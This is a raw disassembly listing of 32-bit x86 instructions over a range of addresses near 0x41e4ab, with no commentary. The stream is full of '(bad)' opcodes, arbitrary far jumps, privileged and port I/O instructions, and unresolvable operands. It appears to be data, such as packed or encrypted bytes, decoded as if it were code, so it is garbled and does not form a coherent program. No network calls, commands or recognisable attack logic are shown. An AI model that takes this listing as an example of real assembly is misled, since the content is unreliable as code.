  41e4ab:	push   ebp
  41e4ac:	scas   eax,DWORD PTR es:[edi]
  41e4ad:	fiadd  DWORD PTR [esp+ecx*2+0x4f4d8d15]
  41e4b4:	sti    
  41e4b5:	stos   DWORD PTR es:[edi],eax
  41e4b6:	push   eax
  41e4b7:	jmp    0x2ba7:0xb9e4a819
  41e4be:	adc    eax,0x1adacc88
  41e4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4c4:	mov    dl,0x21
  41e4c6:	and    eax,0x448c5ae6
  41e4cb:	popf   
  41e4cc:	aam    0x30
  41e4ce:	inc    esp
  41e4cf:	xor    eax,0xde3dc72c
  41e4d4:	cmp    cl,BYTE PTR [edx+0x58]
  41e4d7:	jb     0x41e553
  41e4d9:	or     al,bh
  41e4db:	das    
  41e4dc:	(bad)  
  41e4dd:	es jp  0x41e47f
  41e4e0:	or     eax,0x237e1257
  41e4e5:	xlat   BYTE PTR ds:[ebx]
  41e4e6:	scas   eax,DWORD PTR es:[edi]
  41e4e7:	jle    0x41e46c
  41e4e9:	inc    esp
  41e4ea:	mov    ebx,DWORD PTR [ecx+eax*1+0x23]
  41e4ee:	aaa    
  41e4ef:	test   eax,0xaf28dd2f
  41e4f4:	xchg   ebx,eax
  41e4f5:	into   
  41e4f6:	jns    0x41e49f
  41e4f8:	pop    ecx
  41e4f9:	jmp    0xb5d5:0x5cc5492c
  41e500:	(bad)  
  41e501:	clc    
  41e502:	sub    BYTE PTR [ecx-0x2a02a5e4],cl
  41e508:	pop    eax
  41e509:	stos   DWORD PTR es:[edi],eax
  41e50a:	jmp    0x41e55d
  41e50c:	pop    esi
  41e50d:	test   al,0xbb
  41e50f:	or     BYTE PTR [ecx+eiz*8],bh
  41e512:	and    cl,al
  41e514:	call   eax
  41e516:	cld    
  41e517:	cmp    ecx,DWORD PTR [edi+0x73]
  41e51a:	push   ecx
  41e51b:	and    dh,BYTE PTR [esi-0x40270fc1]
  41e521:	iret   
  41e522:	lahf   
  41e523:	sti    
  41e524:	scas   eax,DWORD PTR es:[edi]
  41e525:	and    DWORD PTR [ebx-0x69],ecx
  41e528:	cs ss inc eax
  41e52b:	std    
  41e52c:	fist   DWORD PTR [ebx+0x5e]
  41e52f:	adc    DWORD PTR [esi],ebp
  41e531:	xchg   esp,eax
  41e532:	xchg   ah,dl
  41e534:	stos   DWORD PTR es:[edi],eax
  41e535:	adc    ebx,DWORD PTR [edx+0x7a40c1c4]
  41e53b:	push   0xa7fe91e8
  41e540:	ret    0x2e40
  41e543:	call   0x5aa19ed
  41e548:	adc    al,0x5e
  41e54a:	and    al,0xd5
  41e54c:	jo     0x41e4f9
  41e54e:	cmp    esp,DWORD PTR [eax-0x3f]
  41e551:	cmp    BYTE PTR [ebx-0x77e252a3],dh
  41e557:	je     0x41e57c
  41e559:	mov    cl,0xc3
  41e55b:	pop    si
  41e55d:	xor    DWORD PTR [eax],edx
  41e55f:	hlt    
  41e560:	sub    cl,BYTE PTR [edx+0x577c2648]
  41e566:	inc    edi
  41e567:	cld    
  41e568:	(bad)  
  41e569:	mov    ch,0xc3
  41e56b:	hlt    
  41e56c:	std    
  41e56d:	xchg   esp,eax
  41e56e:	mov    ebx,0x679b9c72
  41e573:	in     al,0x41
  41e575:	retf   
  41e576:	dec    esp
  41e577:	rcl    BYTE PTR [edi],1
  41e579:	push   0xffffffb8
  41e57b:	dec    edx
  41e57c:	xlat   BYTE PTR ds:[ebx]
  41e57d:	(bad)  
  41e57e:	nop
  41e57f:	adc    BYTE PTR [edi],dl
  41e581:	xor    ecx,DWORD PTR [edx]
  41e583:	fs sti 
  41e585:	ret    0x6281
  41e588:	fldl2t 
  41e58a:	outs   dx,BYTE PTR ds:[esi]
  41e58b:	int3   
  41e58c:	in     al,0x28
  41e58e:	je     0x41e566
  41e590:	inc    esi
  41e591:	sti    
  41e592:	jmp    0x8951:0xa8b19595
  41e599:	add    bh,ah
  41e59b:	(bad)  
  41e59c:	xchg   esp,eax
  41e59d:	pop    eax
  41e59e:	xchg   ebx,eax
  41e59f:	pushf  
  41e5a0:	inc    esp
  41e5a1:	push   ebp
  41e5a2:	not    DWORD PTR [ebp+ebx*8-0x2cc634a9]
  41e5a9:	icebp  
  41e5aa:	(bad)  
  41e5ac:	xchg   ebp,eax
  41e5ad:	test   DWORD PTR [ebx],ebp
  41e5af:	pop    esi
  41e5b0:	icebp  
  41e5b1:	or     BYTE PTR [ecx],ch
  41e5b3:	jl     0x41e621
  41e5b5:	pop    esp
  41e5b6:	inc    esi
  41e5b7:	pop    ds
  41e5b8:	pop    ds
  41e5b9:	and    eax,0xf780f488
  41e5be:	pop    ss
  41e5bf:	aaa    
  41e5c0:	cmp    ch,bl
  41e5c2:	adc    DWORD PTR [edi],ebp
  41e5c4:	out    0xe7,eax
  41e5c6:	adc    al,0xdc
  41e5c8:	mov    al,ds:0xd06f4414
  41e5cd:	(bad)  
  41e5cf:	pop    esi
  41e5d0:	dec    ebx
  41e5d1:	in     al,0x47
  41e5d3:	or     DWORD PTR [ecx+0x50],esi
  41e5d6:	jo     0x41e617
  41e5d8:	or     DWORD PTR [eax-0x63d869df],esi
  41e5de:	fst    QWORD PTR [eax+0x7c67ae24]
  41e5e4:	jns    0x41e638
  41e5e6:	jmp    0xa697569
  41e5eb:	ds mov bl,0xda
  41e5ee:	jne    0x41e5ab
  41e5f0:	jg     0x41e5e8
  41e5f2:	inc    ebx
  41e5f3:	aaa    
  41e5f4:	push   ecx
  41e5f5:	addr16 mov al,ds:0xd4f3
  41e5f9:	mov    cl,0xe4
  41e5fb:	pop    ebx
  41e5fc:	sub    BYTE PTR ds:0xfbb4c966,bl
  41e602:	fstp   DWORD PTR [ebx-0x71056457]
  41e608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e609:	ror    BYTE PTR [edx-0x75],cl
  41e60c:	addr16 pop ebp
  41e60f:	sbb    DWORD PTR [esi+0x6da32160],esi
  41e615:	push   0x38
  41e617:	mov    edx,0x377bbad3
  41e61c:	pop    esi
  41e61d:	xchg   esp,eax
  41e61e:	and    al,0xb9
  41e620:	es adc dl,ch
  41e623:	xlat   BYTE PTR ds:[ebx]
  41e624:	iret   
  41e625:	hlt    
  41e626:	and    cl,ch
  41e628:	xor    BYTE PTR [edi+edx*4],cl
  41e62b:	aam    0xc4
  41e62d:	cmp    ebp,DWORD PTR [ebp+0x19]
  41e630:	push   ebp
  41e631:	xchg   ebp,eax
  41e632:	cwde   
  41e633:	ins    DWORD PTR es:[edi],dx
  41e634:	sub    al,BYTE PTR [esi+eiz*1+0x33472f91]
  41e63b:	fdivr  st(6),st
  41e63d:	jns    0x41e5ce
  41e63f:	xchg   edi,eax
  41e640:	ja     0x41e66c
  41e642:	jae    0x41e5ca
  41e644:	xor    BYTE PTR [eax-0x75],0x43
  41e648:	inc    eax
  41e649:	retf   
  41e64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e64b:	and    edx,DWORD PTR [edi+0x79b724b1]
  41e651:	outs   dx,DWORD PTR ds:[esi]
  41e652:	push   edx
  41e653:	int3   
  41e654:	cmp    eax,0xb502a649
  41e659:	cwde   
  41e65a:	ret    
  41e65b:	sbb    ecx,DWORD PTR [edi-0xf52246d]
  41e661:	mov    bh,0x88
  41e663:	push   ds
  41e664:	xchg   BYTE PTR [edx-0x7d88a264],dh
  41e66a:	push   es
  41e66b:	pop    ds
  41e66c:	add    DWORD PTR [eax],ebp
  41e66e:	test   DWORD PTR [edi],edi
  41e670:	inc    edx
  41e671:	frstor [edi+0x66]
  41e674:	outs   dx,BYTE PTR ds:[esi]
  41e675:	jg     0x41e6d8
  41e677:	add    BYTE PTR [eax-0x14],ah
  41e67a:	jmp    0x93038c35
  41e67f:	jne    0x41e65a
  41e681:	stos   BYTE PTR es:[edi],al
  41e682:	pop    ss
  41e683:	pop    es
  41e684:	ins    BYTE PTR es:[edi],dx
  41e685:	nop    DWORD PTR [edx+ebp*2-0x21]
  41e68a:	lods   al,BYTE PTR ds:[si]
  41e68c:	jmp    0x8daefced
  41e691:	pop    ecx
  41e692:	cli    
  41e693:	ja     0x41e6ba
  41e695:	retf   0xe6ff
  41e698:	mov    dl,0x25
  41e69a:	aas    
  41e69b:	sub    edi,ebp
  41e69d:	test   al,0x56
  41e69f:	push   edx
  41e6a0:	retf   
  41e6a1:	cmp    eax,0x482865e
  41e6a6:	not    BYTE PTR [ecx+0x2b4ab3bb]
  41e6ac:	pop    edi
  41e6ad:	jmp    0x41e691
  41e6af:	pusha  
  41e6b0:	cmp    al,0xe9
  41e6b2:	xor    esi,edi
  41e6b4:	mov    dl,0xa9
  41e6b6:	(bad)  
  41e6b7:	pop    esp
  41e6b8:	adc    ebp,DWORD PTR [esp+eax*8+0x3d]
  41e6bc:	xor    esp,DWORD PTR [bx+si-0x22cc]
  41e6c1:	(bad)  
  41e6c2:	fst    DWORD PTR [ecx+0x53]
  41e6c5:	inc    edx
  41e6c6:	scas   al,BYTE PTR es:[edi]
  41e6c7:	adc    esi,edx
  41e6c9:	cmp    BYTE PTR [eax],dl
  41e6cb:	mov    esi,0x19e0845b
  41e6d0:	and    ecx,ebx
  41e6d2:	rcl    esp,1
  41e6d4:	mov    WORD PTR [esi+0x1c],gs
  41e6d7:	out    dx,eax
  41e6d8:	jmp    0x41e740
  41e6da:	bound  edx,QWORD PTR [eax-0x12]
  41e6dd:	int    0x18
  41e6df:	cld    
  41e6e0:	cmp    eax,0xf6a373b7
  41e6e5:	or     DWORD PTR ds:0x46b5bab5,0x45
  41e6ec:	jns    0x41e6cb
  41e6ee:	int3   
  41e6ef:	clc    
  41e6f0:	dec    edx
  41e6f1:	jno    0x41e72a
  41e6f3:	pop    esp
  41e6f4:	or     DWORD PTR [esi+0x852a6fe],edi
  41e6fa:	test   eax,0x7b420fae
  41e6ff:	fistp  DWORD PTR [eax-0x2d5df27a]
  41e705:	jp     0x41e6d6
  41e707:	adc    ah,0xdb
  41e70a:	adc    eax,0xc7052bc6
  41e70f:	test   DWORD PTR [esi+eiz*4],esi
  41e712:	jb     0x41e695
  41e714:	stos   BYTE PTR es:[edi],al
  41e715:	iret   
  41e716:	icebp  
  41e717:	mov    ss,WORD PTR [ecx-0x168f9285]
  41e71d:	adc    ebx,DWORD PTR [esi-0x1f8e222d]
  41e723:	std    
  41e724:	sbb    al,0xab
  41e726:	mov    ebx,0xdf0a8910
  41e72b:	inc    edi
  41e72c:	ins    DWORD PTR es:[edi],dx
  41e72d:	lods   eax,DWORD PTR ds:[esi]
  41e72e:	je     0x41e6f7
  41e730:	(bad)  
  41e731:	mov    dl,0x32
  41e733:	data16 loop 0x41e6ca
  41e736:	push   0x5dec7a1d
  41e73b:	inc    edx
  41e73c:	push   cs
  41e73d:	mov    edx,0x362628ba
  41e742:	bound  edx,QWORD PTR [ebp+0x1b9de16e]
  41e748:	mov    ebp,0xd8a8b593
  41e74d:	inc    edx
  41e74e:	inc    edx
  41e74f:	loopne 0x41e6d3
  41e751:	mov    ebx,0x18ad88bc
  41e756:	adc    eax,0xe3c157af
  41e75b:	loop   0x41e739
  41e75d:	ret    0x4a75
  41e760:	mov    bh,0x40
  41e762:	or     eax,0xdf0fc884
  41e767:	mov    dl,0xad
  41e769:	add    bh,BYTE PTR fs:[ecx-0x645f7bde]
  41e770:	nop
  41e771:	inc    ecx
  41e772:	xor    DWORD PTR [edi+0x59508115],0x1
  41e779:	jb     0x41e762
  41e77b:	jmp    0x41e788
  41e77d:	adc    eax,0xa67cde47
  41e782:	push   ebp
  41e783:	pop    ds
  41e784:	mov    al,0x48
  41e786:	imul   ebp,DWORD PTR [esi+eiz*8],0xb3010cf1
  41e78d:	push   ebx
  41e78e:	and    BYTE PTR [ebx],dl
  41e790:	add    esi,0x3
  41e793:	das    
  41e794:	sti    
  41e795:	push   eax
  41e796:	cmp    DWORD PTR [edi+0x61],ebp
  41e799:	push   ss
  41e79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e79b:	fldenv [edx]
  41e79d:	xchg   esi,eax
  41e79e:	mov    edx,0x3b50f752
  41e7a3:	call   0x438b82e1
  41e7a8:	les    eax,FWORD PTR [edi-0x16]
  41e7ab:	jns    0x41e776
  41e7ad:	leave  
  41e7ae:	or     eax,0x2541a7cb
  41e7b3:	scas   al,BYTE PTR es:[edi]
  41e7b4:	(bad)  
  41e7b5:	push   esp
  41e7b6:	outs   dx,BYTE PTR ds:[esi]
  41e7b7:	into   
  41e7b8:	or     eax,0xee5377d1
  41e7bd:	ins    BYTE PTR es:[edi],dx
  41e7be:	pushf  
  41e7bf:	mov    esp,DWORD PTR [eax-0x6a9875fe]
  41e7c5:	dec    edx
  41e7c6:	pop    ecx
  41e7c7:	mov    dh,0x86
  41e7c9:	or     eax,0x6670fae
  41e7ce:	push   esp
  41e7cf:	xchg   edi,eax
  41e7d0:	mov    al,ds:0x25cb0657
  41e7d5:	add    eax,0x1dc9a11c
  41e7da:	mov    ?,WORD PTR [edi+edx*1+0x358a3bc3]
  41e7e1:	test   al,0x37
  41e7e3:	aam    0xc8
  41e7e5:	adc    BYTE PTR [ebx-0x6679c86a],ch
  41e7eb:	mov    ds:0xf31c054a,eax
  41e7f0:	bound  esi,QWORD PTR [ebx]
  41e7f2:	fld    st(0)
  41e7f4:	scas   eax,DWORD PTR es:[edi]
  41e7f5:	pusha  
  41e7f6:	ins    DWORD PTR es:[edi],dx
  41e7f7:	outs   dx,DWORD PTR ds:[esi]
  41e7f8:	lea    esp,[eax+ecx*8]
  41e7fb:	push   ebx
  41e7fc:	jbe    0x48127365
  41e802:	lock sub BYTE PTR [eax+0x7b],dl
  41e806:	pop    ebp
  41e807:	out    dx,al
  41e808:	call   0x7cba:0x4efbe428
  41e80f:	retf   0xfb8d
  41e812:	pop    ecx
  41e813:	dec    eax
  41e814:	jle    0x41e80e
  41e816:	cld    
  41e817:	imul   edx,eax,0xffffffdc
  41e81a:	clc    
  41e81b:	mov    ecx,0x8a47a6f6
  41e820:	mov    ds:0x5c3cbd83,eax
  41e825:	mov    dh,0x1e
  41e827:	es adc cl,bh
  41e82a:	mov    ?,WORD PTR [ecx]
  41e82c:	das    
  41e82d:	ror    BYTE PTR [edi-0x7d4344d6],cl
  41e833:	fadd   QWORD PTR [esp+ebp*2-0x623850a2]
  41e83a:	sub    ch,BYTE PTR [ecx+0x67cd4f3b]
  41e840:	push   esi
  41e841:	adc    al,0xe4
  41e843:	frstor [edx+0x11]
  41e846:	jne    0x41e7e5
  41e848:	sti    
  41e849:	imul   ecx,ebp,0x25
  41e84c:	inc    ebx
  41e84d:	fwait
  41e84e:	lods   eax,DWORD PTR ds:[esi]
  41e84f:	cmp    esp,ebp
  41e851:	cwde   
  41e852:	pop    ss
  41e853:	je     0x41e849
  41e855:	lods   al,BYTE PTR ds:[esi]
  41e856:	jle    0x41e8ce
  41e858:	mov    esi,0xba07ad19
  41e85d:	jae    0x41e80b
  41e85f:	sub    esp,DWORD PTR [ecx]
  41e861:	ss sub ecx,edx
  41e864:	out    0x4c,eax
  41e866:	jmp    0x41e825
  41e868:	dec    edi
  41e869:	mov    ebx,DWORD PTR [ebp+0x23]
  41e86c:	inc    eax
  41e86d:	outs   dx,BYTE PTR ds:[esi]
  41e86e:	icebp  
  41e86f:	cmc    
  41e870:	ins    BYTE PTR es:[edi],dx
  41e871:	mov    edx,0x315569c5
  41e876:	mov    esp,0x70efa9d8
  41e87b:	mov    ds:0xb791772c,al
  41e880:	push   cs
  41e881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e882:	jo     0x41e8c0
  41e884:	jecxz  0x41e817
  41e886:	jb     0x41e8a0
  41e888:	fwait
  41e889:	call   0xd3685537
  41e88e:	into   
  41e88f:	mov    edi,0xf64e9e96
  41e894:	cmp    BYTE PTR [esi-0x231251df],al
  41e89a:	inc    edx
  41e89b:	sbb    ebx,DWORD PTR ds:0x28955ad8
  41e8a1:	iret   
  41e8a2:	fcom   QWORD PTR [ebp+0x14]
  41e8a5:	(bad)  
  41e8a6:	adc    BYTE PTR [esp+eax*1+0x76],al
  41e8aa:	jno    0x41e90b
  41e8ac:	mov    ?,ebx
  41e8ae:	jmp    0x41e8b4
  41e8b0:	jae    0x41e8e5
  41e8b2:	add    ecx,DWORD PTR [edi]
  41e8b4:	dec    esp
  41e8b5:	or     ecx,DWORD PTR [ecx-0x46]
  41e8b8:	hlt    
  41e8b9:	rcl    BYTE PTR [eax+ecx*1],cl
  41e8bc:	dec    esi
  41e8bd:	and    al,0x8f
  41e8bf:	dec    ecx
  41e8c0:	hlt    
  41e8c1:	sbb    eax,0x15bac32a
  41e8c6:	loope  0x41e858
  41e8c8:	dec    ecx
  41e8c9:	push   ss
  41e8ca:	sbb    ch,ch
  41e8cc:	add    edi,ebp
  41e8ce:	dec    DWORD PTR [ebp-0x40]
  41e8d1:	int3   
  41e8d2:	push   edx
  41e8d3:	inc    ebx
  41e8d4:	loopne 0x41e87d
  41e8d6:	(bad)  
  41e8d7:	pop    edx
  41e8d8:	ficomp WORD PTR [ebp+0x1962aba2]
  41e8de:	sbb    BYTE PTR [edi],cl
  41e8e0:	or     eax,0xa91e95fa
  41e8e5:	sbb    eax,0x6e213690
  41e8ea:	in     eax,0xf6
  41e8ec:	sub    dh,BYTE PTR [eax+edi*1-0x4c]
  41e8f0:	sbb    dl,BYTE PTR [ebp-0x43]
  41e8f3:	outs   dx,BYTE PTR ds:[esi]
  41e8f4:	sbb    ah,0x24
  41e8f7:	inc    eax
  41e8f8:	push   ebp
  41e8f9:	or     al,0x23
  41e8fb:	cmc    
  41e8fc:	in     eax,dx
  41e8fd:	sub    DWORD PTR [ebp+0x77],ebp
  41e900:	mov    esi,0xabed3d81
  41e905:	sbb    esp,edi
  41e907:	xor    ebp,DWORD PTR [ecx-0x5a]
  41e90a:	test   BYTE PTR [ecx+eax*8+0x3ef7a921],dl
  41e911:	adc    eax,0x1e53caa6
  41e916:	or     DWORD PTR [ecx],0xffffff98
  41e919:	fs aam 0x5d
  41e91c:	xchg   esi,eax
  41e91d:	mov    al,ds:0x8ad4cb7e
  41e922:	inc    esi
  41e923:	nop
  41e924:	repz std 
  41e926:	sbb    cl,BYTE PTR [edx+0x25]
  41e929:	sbb    esp,DWORD PTR [esi]
  41e92b:	cmp    eax,0x3c989dec
  41e930:	mov    eax,0xd7ddee1
  41e935:	cdq    
  41e936:	aas    
  41e937:	push   0xc4ff6d1a
  41e93c:	pop    eax
  41e93d:	test   DWORD PTR [ecx],edx
  41e93f:	inc    ecx
  41e940:	push   ecx
  41e941:	mov    ds:0x75158d00,eax
  41e946:	fwait
  41e947:	xchg   ebx,eax
  41e948:	mov    gs,ebx
  41e94a:	cmp    al,0xe8
  41e94c:	(bad)  
  41e94d:	popf   
  41e94e:	ins    BYTE PTR es:[edi],dx
  41e94f:	lea    esp,[edi+edx*2]
  41e952:	xchg   esp,eax
  41e953:	pop    ds
  41e954:	test   bh,0x51
  41e957:	in     al,0xbd
  41e959:	push   eax
  41e95a:	add    bl,BYTE PTR [eax-0x13578c95]
  41e960:	in     al,0x39
  41e962:	inc    esp
  41e963:	xchg   edi,eax
  41e964:	rcr    DWORD PTR [ebx+ebx*4-0x2cc10dd3],cl
  41e96b:	lea    ebx,[ebp-0x386c5dd2]
  41e971:	xchg   DWORD PTR [edi-0x782d83ea],edi
  41e977:	stc    
  41e978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e979:	cli    
  41e97a:	or     dl,bl
  41e97c:	(bad)  
  41e97d:	mov    al,ds:0x11757206
  41e982:	mov    ds:0x1f398952,eax
  41e987:	mov    al,0xf9
  41e989:	fcomp  QWORD PTR [ebp-0x140176c0]
  41e98f:	pop    eax
  41e990:	dec    ecx
  41e991:	jg     0x41ea01
  41e993:	sub    edx,DWORD PTR gs:[eax+0x695d5b8f]
  41e99a:	mov    ch,al
  41e99c:	add    DWORD PTR [ebx+0x711e83b5],ebp
  41e9a2:	ins    DWORD PTR es:[edi],dx
  41e9a3:	les    ecx,FWORD PTR [eax]
  41e9a5:	and    eax,0x87a412ed
  41e9aa:	jae    0x41ea2a
  41e9ac:	jns    0x41ea29
  41e9ae:	mov    ds:0x2a274b13,eax
  41e9b3:	cmc    
  41e9b4:	ins    DWORD PTR es:[edi],dx
  41e9b5:	cwde   
  41e9b6:	sub    edi,DWORD PTR [edx]
  41e9b8:	daa    
  41e9b9:	fld    TBYTE PTR [ebx+0x5a]
  41e9bc:	(bad)  
  41e9bd:	mul    BYTE PTR [eax+0x16]
  41e9c0:	and    BYTE PTR [edx+eiz*4+0xc22a6af],bh
  41e9c7:	jno    0x41ea3d
  41e9c9:	(bad)  
  41e9ca:	popa   
  41e9cb:	push   cs
  41e9cc:	pop    ecx
  41e9cd:	scas   al,BYTE PTR es:[edi]
  41e9ce:	daa    
  41e9cf:	mov    cl,0xc0
  41e9d1:	sub    BYTE PTR [ecx+0x3ce5afd],bh
  41e9d7:	sti    
  41e9d8:	dec    esi
  41e9d9:	pop    edx
  41e9da:	pop    ebx
  41e9db:	jmp    0x21e8875c
  41e9e0:	cwde   
  41e9e1:	dec    edi
  41e9e2:	mov    dl,0x81
  41e9e4:	inc    esi
  41e9e5:	xchg   ebx,ecx
  41e9e7:	and    al,0xb6
  41e9e9:	and    DWORD PTR [eax+ebp*2+0x4f949f0f],esi
  41e9f0:	lahf   
  41e9f1:	and    DWORD PTR [eax],0xd58524b3
  41e9f7:	jbe    0x41e979
  41e9f9:	sti    
  41e9fa:	mov    cl,0xf8
  41e9fc:	imul   edx,DWORD PTR [ebx-0x14],0xb62a92d0
  41ea03:	and    eax,0xaeff1c9f
  41ea08:	jmp    0x41e9fa
  41ea0a:	xor    bh,dl
  41ea0c:	(bad)  [ecx-0x1e44e25a]
  41ea12:	popf   
  41ea13:	test   al,0x5e
  41ea15:	jg     0x41ea78
  41ea17:	xor    bh,bl
  41ea19:	aam    0xe
  41ea1b:	sbb    esi,DWORD PTR [esi]
  41ea1d:	dec    edi
  41ea1e:	retf   
  41ea1f:	int3   
  41ea20:	push   ebx
  41ea21:	repz sub esi,DWORD PTR [edi]
  41ea24:	mov    cs,WORD PTR [edi+0xe]
  41ea27:	add    eax,0x39ba7615
  41ea2c:	(bad)  
  41ea2e:	lods   eax,DWORD PTR ds:[esi]
  41ea2f:	push   edi
  41ea30:	call   0xa44bb479
  41ea35:	push   edx
  41ea36:	ss jnp 0x41ea1d
  41ea39:	xchg   ecx,edx
  41ea3b:	jge    0x41ea0e
  41ea3d:	sbb    eax,ebp
  41ea3f:	or     al,0xee
  41ea41:	xor    BYTE PTR [eax+0x7c],cl
  41ea44:	xor    DWORD PTR [esi-0x19],0xfa3a0b98
  41ea4b:	aam    0x13
  41ea4d:	and    dl,BYTE PTR [ebx]
  41ea4f:	test   DWORD PTR [esp+ecx*4+0x5476537b],0x8c823fc0
  41ea5a:	jb     0x41ea35
  41ea5c:	int3   
  41ea5d:	or     eax,0x44f4ebc8
  41ea62:	pop    esi
  41ea63:	(bad)  
  41ea64:	in     eax,0x9b
  41ea66:	cdq    
  41ea67:	icebp  
  41ea68:	cmp    al,0x63
  41ea6a:	(bad)  
  41ea6b:	ins    DWORD PTR es:[edi],dx
  41ea6c:	mov    dh,0x18
  41ea6e:	test   BYTE PTR [ebx-0x3ea1dea6],0x9
  41ea75:	push   esp
  41ea77:	jae    0x41ea9c
  41ea79:	jbe    0x41eae7
  41ea7b:	mov    ch,0xcf
  41ea7d:	call   FWORD PTR ds:0x3a346076
  41ea83:	mov    ch,0x20
  41ea85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea86:	sub    BYTE PTR [ecx-0x19],0x3f
  41ea8a:	pop    esp
  41ea8b:	sbb    ecx,eax
  41ea8d:	dec    ebp
  41ea8e:	inc    esi
  41ea8f:	popa   
  41ea90:	js     0x41ea79
  41ea92:	pop    ebp
  41ea93:	ins    BYTE PTR es:[edi],dx
  41ea94:	jo     0x41eaa2
  41ea96:	out    dx,eax
  41ea97:	ins    BYTE PTR es:[edi],dx
  41ea98:	sub    BYTE PTR [ecx],ah
  41ea9a:	js     0x41ea8c
  41ea9c:	xchg   edx,eax
  41ea9d:	test   ch,cl
  41ea9f:	ja     0x41ea63
  41eaa1:	mov    esi,0xe75b200
  41eaa6:	es pop edi
  41eaa8:	jo     0x41ea92
  41eaaa:	push   ebx
  41eaab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaac:	aaa    
  41eaad:	sti    
  41eaae:	xchg   esi,eax
  41eaaf:	xor    al,0x14
  41eab1:	addr16 jae 0x41eaa3
  41eab4:	xor    al,0x14
  41eab6:	dec    ebx
  41eab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab8:	jle    0x41eae1
  41eaba:	in     eax,dx
  41eabb:	setne  BYTE PTR [ebx]
  41eabe:	in     eax,dx
  41eabf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eac0:	mov    ds:0x694ad7ab,eax
  41eac5:	loope  0x41eb15
  41eac7:	jno    0x41eb00
  41eac9:	ja     0x41eaa9
  41eacb:	stc    
  41eacc:	clc    
  41eacd:	mov    ds:0xbbc6ea65,al
  41ead2:	xchg   edx,eax
  41ead3:	mov    BYTE PTR [ebx+0xdb6952],0x2e
  41eada:	mov    bh,0x91
  41eadc:	pusha  
  41eadd:	outs   dx,BYTE PTR ds:[esi]
  41eade:	fs cwde 
  41eae0:	mov    ch,0xc8
  41eae2:	lods   al,BYTE PTR ds:[esi]
  41eae3:	stos   BYTE PTR es:[edi],al
  41eae4:	dec    ebp
  41eae5:	sub    al,0x8c
  41eae7:	cmp    DWORD PTR [ecx+0x1],ebx
  41eaea:	aad    0x17
  41eaec:	lock add BYTE PTR [esi+0x25f03e02],bl
  41eaf3:	pop    esp
  41eaf4:	xchg   esi,eax
  41eaf5:	fisub  DWORD PTR [ebp-0x78]
  41eaf8:	inc    esi
  41eaf9:	mov    esi,0x3bae1003
  41eafe:	mov    esi,0xbd491cb4
  41eb03:	lods   al,BYTE PTR ds:[esi]
  41eb04:	and    eax,0x2154d236
  41eb09:	mov    ebx,0x482ba90f
  41eb0e:	enter  0x8db8,0xae
  41eb12:	adc    al,0x77
  41eb14:	sub    ah,bl
  41eb16:	(bad)  
  41eb17:	mov    ds:0x48bbb978,eax
  41eb1c:	xchg   ebx,eax
  41eb1d:	xor    BYTE PTR [ecx],bl
  41eb1f:	push   0x4cbf6f13
  41eb24:	jno    0x41eb84
  41eb26:	add    esi,edi
  41eb28:	in     eax,0x26
  41eb2a:	sbb    DWORD PTR [edi],esi
  41eb2c:	jae    0x41eac3
  41eb2e:	dec    esi
  41eb2f:	pop    eax
  41eb30:	xchg   esp,eax
  41eb31:	mov    ?,WORD PTR [edi-0x72]
  41eb34:	sbb    eax,0xb9ce3e0
  41eb39:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb3b:	jmp    0xe51:0xb639e18
  41eb42:	test   al,0x27
  41eb44:	aaa    
  41eb45:	push   esp
  41eb46:	adc    DWORD PTR [edi-0x6ea18c2f],edi
  41eb4c:	inc    esp
  41eb4d:	xor    al,ch
  41eb4f:	test   DWORD PTR [esi-0x58],edx
  41eb52:	sahf   
  41eb53:	cmp    DWORD PTR [ecx-0x57],ecx
  41eb56:	int    0x9e
  41eb58:	test   DWORD PTR [eax+ebx*2-0x4b],ebx
  41eb5c:	fstp   DWORD PTR [eax]
  41eb5e:	cdq    
  41eb5f:	inc    eax
  41eb60:	lea    esp,[ecx-0x3b]
  41eb63:	loopne 0x41eb9a
  41eb65:	js     0x41ebbb
  41eb67:	test   BYTE PTR [ebp+0x18],bl
  41eb6a:	dec    edx
  41eb6b:	js     0x41eb0b
  41eb6d:	xchg   edx,eax
  41eb6e:	popa   
  41eb6f:	sub    edx,DWORD PTR [eax+0x45]
  41eb72:	out    0x1a,eax
  41eb74:	aam    0x21
  41eb76:	fisub  WORD PTR [esi]
  41eb78:	imul   eax,esp,0x5b
  41eb7b:	push   ss
  41eb7c:	sar    BYTE PTR [edi-0x2b1fc03b],0xa4
  41eb83:	mov    dl,0x3d
  41eb85:	adc    BYTE PTR [eax+0x32],bh
  41eb88:	les    esi,FWORD PTR [esi-0x3d]
  41eb8b:	in     eax,0x3b
  41eb8d:	js     0x41eb46
  41eb8f:	les    esp,FWORD PTR [eax+0x2d]
  41eb92:	into   
  41eb93:	or     dl,BYTE PTR [edx+0x34b57e5e]
  41eb99:	jbe    0x41ebf1
  41eb9b:	mov    ebx,0xf88129ea
  41eba0:	add    eax,0x1420fcf
  41eba5:	xchg   esi,eax
  41eba6:	or     BYTE PTR ds:0x7d0c87ec,ah
  41ebac:	frstor [ebx-0x38]
  41ebaf:	imul   esi,DWORD PTR [eax-0x52],0x6819b3d8
  41ebb6:	adc    DWORD PTR [esi-0x3e7f1200],ebx
  41ebbc:	in     eax,dx
  41ebbd:	icebp  
  41ebbe:	adc    DWORD PTR ds:0xb93c0cb,edx
  41ebc4:	daa    
  41ebc5:	jo     0x41ec42
  41ebc7:	cmp    al,0x71
  41ebc9:	jae    0x41ebb4
  41ebcb:	arpl   WORD PTR [eax],sp
  41ebcd:	add    al,0xaf
  41ebcf:	mov    cl,0x1d
  41ebd1:	add    BYTE PTR ds:0xe56b738,0xf6
  41ebd8:	cmp    eax,0xe4babef3
  41ebdd:	add    eax,0xbdbebb43
  41ebe2:	int    0xc9
  41ebe4:	stc    
  41ebe5:	sbb    eax,0x9ee47f0e
  41ebea:	sub    dl,BYTE PTR [ecx+0x20]
  41ebed:	xor    BYTE PTR ds:0x162598f9,bl
